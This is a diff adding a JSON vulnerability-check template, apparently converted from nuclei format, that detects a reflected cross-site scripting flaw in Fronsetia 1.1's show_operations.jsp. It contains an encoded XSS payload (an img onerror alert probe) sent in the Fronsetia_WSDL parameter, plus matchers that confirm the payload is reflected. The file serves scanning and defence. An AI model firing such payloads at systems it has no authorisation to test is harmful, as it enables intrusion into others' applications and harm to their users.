@@ -1,0 +1,120 @@
+{
+  "id": "fronsetiav-xss",
+  "name": "Fronsetiav1.1 - Cross-Site Scripting",
+  "author": "s4e-io",
+  "severity": "HIGH",
+  "description": "The fronsetiav1.1 application is vulnerable to a Reflected XSS attack through the show_operations.jsp endpoint. An attacker can inject malicious scripts via the WSDL Location input, which is executed in the victim\u0027s browser due to improper input sanitization. This allows attackers to execute arbitrary JavaScript, potentially stealing sensitive data or performing phishing attacks..\n",
+  "references": [
+    "https://seclists.org/fulldisclosure/2024/Nov/10",
+    "https://packetstormsecurity.com/files/182764/fronsetia-1.1-Cross-Site-Scripting.html",
+    "https://msecureltd.blogspot.com/2024/11/friday-fun-pentest-series-14-reflected.html"
+  ],
+  "tags": [
+    "xss",
+    "fronsetia"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/show_operations.jsp?Fronsetia_WSDL\u003d%22%3E%3Cimg%2Bsrc%3Dx%20onerror%3Dalert(document.domain)%3E",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(body, \"\\\"\u003e\u003cimg src\u003dx onerror\u003dalert(document.domain)\u003e \u003c/title\u003e\")",
+            "contains(content_type, \"text/html\")",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "fronsetiav-xss",
+    "info": {
+      "name": "Fronsetiav1.1 - Cross-Site Scripting",
+      "author": "s4e-io",
+      "severity": "high",
+      "description": "The fronsetiav1.1 application is vulnerable to a Reflected XSS attack through the show_operations.jsp endpoint. An attacker can inject malicious scripts via the WSDL Location input, which is executed in the victim\u0027s browser due to improper input sanitization. This allows attackers to execute arbitrary JavaScript, potentially stealing sensitive data or performing phishing attacks..\n",
+      "reference": [
+        "https://seclists.org/fulldisclosure/2024/Nov/10",
+        "https://packetstormsecurity.com/files/182764/fronsetia-1.1-Cross-Site-Scripting.html",
+        "https://msecureltd.blogspot.com/2024/11/friday-fun-pentest-series-14-reflected.html"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "xss,fronsetia"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/show_operations.jsp?Fronsetia_WSDL\u003d%22%3E%3Cimg%2Bsrc%3Dx%20onerror%3Dalert(document.domain)%3E"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(body, \"\\\"\u003e\u003cimg src\u003dx onerror\u003dalert(document.domain)\u003e \u003c/title\u003e\")",
+              "contains(content_type, \"text/html\")",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
